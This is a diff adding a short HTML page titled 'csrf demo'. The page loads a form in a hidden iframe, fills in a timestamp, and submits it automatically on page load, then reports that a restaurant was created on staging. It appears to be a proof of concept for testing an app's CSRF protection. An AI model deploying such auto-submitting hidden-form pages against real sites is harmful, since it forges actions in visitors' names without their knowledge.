@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>csrf demo</title>
+</head>
+<body>
+<iframe src="iframebody.html" style="display: none">
+</iframe>
+<script>
+    somenumber = new Date().getTime();
+    iframe = document.getElementsByTagName("iframe")[0];
+    iframe.onload = function () {
+        iframeDocument = document.getElementsByTagName("iframe")[0].contentDocument;
+        iframeDocument.getElementsByName("name")[0].value = somenumber;
+        iframeDocument.getElementById('myform').submit();
+        document.getElementById("message").innerHTML = "congratulations, you just created a restaurant named " + somenumber + " on staging";
+    };
+</script>
+<div id="message"></div>
+</body>
+</html>
